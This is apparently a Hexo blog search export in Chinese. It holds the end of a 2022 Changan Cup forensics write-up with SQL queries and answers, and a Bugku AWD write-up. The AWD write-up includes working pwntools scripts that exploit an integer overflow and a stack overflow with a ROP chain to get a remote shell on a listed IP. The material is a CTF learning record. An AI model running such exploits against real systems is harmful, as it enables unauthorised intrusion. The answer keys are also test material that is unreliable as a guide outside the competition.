id="28-还原全部被删改数据，用户id为500的注册会员的HT币钱包地址为"><a href="#28-还原全部被删改数据，用户id为500的注册会员的HT币钱包地址为" class="headerlink" title="28.还原全部被删改数据，用户id为500的注册会员的HT币钱包地址为"></a>28.还原全部被删改数据，用户id为500的注册会员的HT币钱包地址为</h2><p>在member_wallet表中，找到id=500的用户</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240413164220631.png" class title="image-20240413164220631"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">cee631121c2ec9232f3a2f028ad5c89b<br></code></pre></td></tr></table></figure><h2 id="29-还原全部被删改数据，共有多少名用户的会员等级为’LV3’-答案填写阿拉伯数字，如“15”"><a href="#29-还原全部被删改数据，共有多少名用户的会员等级为’LV3’-答案填写阿拉伯数字，如“15”" class="headerlink" title="29.还原全部被删改数据，共有多少名用户的会员等级为’LV3’(答案填写阿拉伯数字，如“15”)"></a>29.还原全部被删改数据，共有多少名用户的会员等级为’LV3’(答案填写阿拉伯数字，如“15”)</h2><p>在member表里搜索等级为3的用户，共158个</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240413164538622.png" class title="image-20240413164538622"><p>在上面数据库文件不包括删除的</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240413165635903.png" class title="image-20240413165635903"><p>在数据库日志中查到下方内容，按照等级为3用户的数据特征搜索973-1000的用户</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240413165552462.png" class title="image-20240413165552462"><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240413165834230.png" class title="image-20240413165834230"><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240413165853503.png" class title="image-20240413165853503"><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240413165911743.png" class title="image-20240413165911743"><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240413165941823.png" class title="image-20240413165941823"><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240413165955719.png" class title="image-20240413165955719"><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240413170018254.png" class title="image-20240413170018254"><p>发现有6个，故答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">158+6=164<br></code></pre></td></tr></table></figure><h2 id="30-还原全部被删改数据，哪些用户ID没有充值记录-答案填写阿拉伯数字，多个ID以逗号分隔，“15-16-17”"><a href="#30-还原全部被删改数据，哪些用户ID没有充值记录-答案填写阿拉伯数字，多个ID以逗号分隔，“15-16-17”" class="headerlink" title="30.还原全部被删改数据，哪些用户ID没有充值记录(答案填写阿拉伯数字，多个ID以逗号分隔，“15,16,17”)"></a>30.还原全部被删改数据，哪些用户ID没有充值记录(答案填写阿拉伯数字，多个ID以逗号分隔，“15,16,17”)</h2><p>在member_wallet里balance为0是没有充值用户（这个表没有被删除数据），查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> id <span class="hljs-keyword">FROM</span> b1.member_wallet <span class="hljs-keyword">WHERE</span> balance <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240413172116771.png" class title="image-20240413172116771"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">318，989<br></code></pre></td></tr></table></figure><h2 id="31-还原全部被删改数据，2022年10月17日总计产生多少笔交易记录？-答案填写阿拉伯数字，如“15”"><a href="#31-还原全部被删改数据，2022年10月17日总计产生多少笔交易记录？-答案填写阿拉伯数字，如“15”" class="headerlink" title="31.还原全部被删改数据，2022年10月17日总计产生多少笔交易记录？(答案填写阿拉伯数字，如“15”)"></a>31.还原全部被删改数据，2022年10月17日总计产生多少笔交易记录？(答案填写阿拉伯数字，如“15”)</h2><p>在member_transaction里查询当天的交易数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> `member_transaction` <span class="hljs-keyword">WHERE</span> create_time <span class="hljs-keyword">BETWEEN</span> &quot;2022-10-17  00:00:00&quot; <span class="hljs-keyword">AND</span> &quot;2022-10-17 23:59:59&quot;<br></code></pre></td></tr></table></figure><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240413172459751.png" class title="image-20240413172459751"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">1000<br></code></pre></td></tr></table></figure><h2 id="32-还原全部被删改数据，该网站中充值的USDT总额为-答案填写阿拉伯数字，如“15”"><a href="#32-还原全部被删改数据，该网站中充值的USDT总额为-答案填写阿拉伯数字，如“15”" class="headerlink" title="32.还原全部被删改数据，该网站中充值的USDT总额为(答案填写阿拉伯数字，如“15”)"></a>32.还原全部被删改数据，该网站中充值的USDT总额为(答案填写阿拉伯数字，如“15”)</h2><p>对金额求和</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">SUM</span>(amount) <span class="hljs-keyword">FROM</span> member_transaction<br></code></pre></td></tr></table></figure><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240413172620549.png" class title="image-20240413172620549"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">408228.00000000<br></code></pre></td></tr></table></figure><h2 id="33-嫌疑人使用的安卓模拟器软件名称是"><a href="#33-嫌疑人使用的安卓模拟器软件名称是" class="headerlink" title="33.嫌疑人使用的安卓模拟器软件名称是"></a>33.嫌疑人使用的安卓模拟器软件名称是</h2><p>检材4解压得到一个npbk文件，百度得到</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240415140318092.png" class title="image-20240415140318092"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">夜神模拟器<br></code></pre></td></tr></table></figure><h2 id="34-检材4中，“老板”的阿里云账号是"><a href="#34-检材4中，“老板”的阿里云账号是" class="headerlink" title="34.检材4中，“老板”的阿里云账号是"></a>34.检材4中，“老板”的阿里云账号是</h2><p>下载模拟器，导入npbk文件，在微信聊天记录里发现老板阿里云账号（这里打开微信需要断开网络，不然微信会退出，要求重新登录）</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240415142327826.png" class title="image-20240415142327826"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">forensixtech1<br></code></pre></td></tr></table></figure><h2 id="35-检材4中安装的VPN工具的软件名称是"><a href="#35-检材4中安装的VPN工具的软件名称是" class="headerlink" title="35.检材4中安装的VPN工具的软件名称是"></a>35.检材4中安装的VPN工具的软件名称是</h2><p>在桌面发现vpn软件</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240415141944182.png" class title="image-20240415141944182"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">v2rayNG<br></code></pre></td></tr></table></figure><h2 id="36-上述VPN工具中记录的节点IP是"><a href="#36-上述VPN工具中记录的节点IP是" class="headerlink" title="36.上述VPN工具中记录的节点IP是"></a>36.上述VPN工具中记录的节点IP是</h2><p>打开vpn，得到</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240415142654778.png" class title="image-20240415142654778"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">38.68.135.18：8090<br></code></pre></td></tr></table></figure><h2 id="37-检材4中，录屏软件安装时间为"><a href="#37-检材4中，录屏软件安装时间为" class="headerlink" title="37.检材4中，录屏软件安装时间为"></a>37.检材4中，录屏软件安装时间为</h2><p>找到手机文件，发现一个LuPingDaShi的文件夹</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240415142957781.png" class title="image-20240415142957781"><p>答案</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2022</span>/<span class="hljs-number">10</span>/<span class="hljs-number">19</span><br></code></pre></td></tr></table></figure><h2 id="38-上述录屏软件中名为“s-20221019105129”的录像，在模拟器存储中对应的原始文件名为"><a href="#38-上述录屏软件中名为“s-20221019105129”的录像，在模拟器存储中对应的原始文件名为" class="headerlink" title="38.上述录屏软件中名为“s_20221019105129”的录像，在模拟器存储中对应的原始文件名为"></a>38.上述录屏软件中名为“s_20221019105129”的录像，在模拟器存储中对应的原始文件名为</h2><p>在手机文件夹/storage/emulated/0/Android/data/com.jiadi.luping/files/Movies目录下得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">0c2f5dd4a9bc6f34873fb3c0ee9b762b98e8c46626410be7191b11710117a12d<br></code></pre></td></tr></table></figure><h2 id="39-上述录屏软件登录的手机号是"><a href="#39-上述录屏软件登录的手机号是" class="headerlink" title="39.上述录屏软件登录的手机号是"></a>39.上述录屏软件登录的手机号是</h2><p>选择帮助与反馈-&gt;账号注销即可看到完整手机号（这里需要连接网络，不然一直在加载）</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240415144224605.png" class title="image-20240415144224605"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">18645091802<br></code></pre></td></tr></table></figure><h2 id="40-检材4中，发送勒索邮件的邮箱地址为"><a href="#40-检材4中，发送勒索邮件的邮箱地址为" class="headerlink" title="40.检材4中，发送勒索邮件的邮箱地址为"></a>40.检材4中，发送勒索邮件的邮箱地址为</h2><p>在qq邮箱中已发送邮件中找到</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240415145413008.png" class title="image-20240415145413008"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">skterran@163.com<br></code></pre></td></tr></table></figure><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="https://blog.csdn.net/qq_56037764/article/details/127834747">2022第四届长安杯复盘（WP）_长安杯复现-CSDN博客</a></p><p><a href="https://www.forensics-wiki.com/writeup/2022changancup/#8-1apkhttpswwwforensixcnabcdef">2022长安杯Writeup - Forensics-Wiki</a></p><p><a href="https://forensics.xidian.edu.cn/wiki/ChanganCup2022/#8-1-apkhttpswwwforensixcnabcdef">2022长安杯 - XDforensics-Wiki (xidian.edu.cn)</a></p><p><a href="https://blog.csdn.net/jyttttttt/article/details/127704893">2022第四届长安杯WRITE UP_2022长安杯wp-CSDN博客</a></p><h2 id="仿真后连接xshell"><a href="#仿真后连接xshell" class="headerlink" title="仿真后连接xshell"></a>仿真后连接xshell</h2><p>连接xshell，<a href="https://blog.csdn.net/ntrybw/article/details/126226322">修改linux内网卡配置，开启dhcp</a>，分配一个ip给虚拟机，重启后查看（当然这里也可以直接挂载在现有linux虚拟机上）</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240409104642658.png" class title="image-20240409104642658">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Bugku AWD S2-23</title>
    <link href="/2024/03/27/S2-23/"/>
    <url>/2024/03/27/S2-23/</url>
    
    <content type="html"><![CDATA[<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><p>本次pwn题是bugku上的pwn题Easy_int，这里做个简单分析。</p><p>查看保护，只有NX保护</p><img src="/2024/03/27/S2-23/image-20240327170536541.png" class title="image-20240327170536541"><p>ida F5分析</p><img src="/2024/03/27/S2-23/image-20240327170625374.png" class title="image-20240327170625374"><p>这里有个简单整数溢出,输入2147483648，执行vuln函数，</p><img src="/2024/03/27/S2-23/image-20240327171034907.png" class title="image-20240327171034907"><p>buf这里有个很明显的栈溢出，存在system函数，但是参数不是/bin/sh。Shirt + F12查找字符串，存在字符/bin/sh</p><img src="/2024/03/27/S2-23/image-20240327171302262.png" class title="image-20240327171302262"><p>所以思路很明确，利用这里的栈溢出修改system的参数，拿shell，</p><img src="/2024/03/27/S2-23/image-20240327171557436.png" class title="image-20240327171557436"><p>64位程序，我们需要先控制rdi寄存器，因此构造rop链：b’a’*(0x20+8)+p64(pop_rdi_ret)+p64(binsh)+p64(system),这里需要考虑下堆栈平衡，加个ret或者直接call _system,给出两个版本代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = remote(&#x27;114.67.175.224&#x27;,17977)</span><br><br>pop_rdi_ret=<span class="hljs-number">0x401343</span><br>ret=<span class="hljs-number">0x40101a</span><br>binsh=<span class="hljs-number">0x403500</span><br>call_system=<span class="hljs-number">0x4011F0</span><br>p.sendline(<span class="hljs-string">b&#x27;2147483648&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;Congratulations!&#x27;</span>)<br><br>p.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>+p64(pop_rdi_ret)+p64(binsh)+p64(call_system))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;114.67.175.224&#x27;</span>,<span class="hljs-number">17977</span>)<br>elf = ELF (<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>system=elf.plt[<span class="hljs-string">&quot;system&quot;</span>]<br><br><span class="hljs-comment">#ROPgadget --binary ./pwn --only &#x27;pop|ret&#x27;</span><br>pop_rdi_ret=<span class="hljs-number">0x401343</span><br>ret=<span class="hljs-number">0x40101a</span><br>binsh=<span class="hljs-number">0x403500</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x20</span>+<span class="hljs-number">8</span>) <br>payload += p64(ret) <br>payload += p64(pop_rdi_ret)<br>payload += p64(binsh) <br>payload += p64(system)<br>p.sendline(<span class="hljs-string">b&#x27;2147483648&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Congratulations!&#x27;</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><p>D盾扫描，存在两个过狗一句话</p><img src="/2024/03/27/S2-23/image-20240327172728529.png" class title="image-20240327172728529"><p>网站cms是PbootCMS V3.0.1，</p>]]></content>
    
    
    <categories>
      
      <category>AWD WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AWD总结</title>
    <link href="/2024/03/26/AWD%E6%80%BB%E7%BB%93/"/>
    <url>/2024/03/26/AWD%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 密码错误" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="e7764154367ee5f345ddc4a5439922be61c877a72393cac0fac4cb7848055814"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
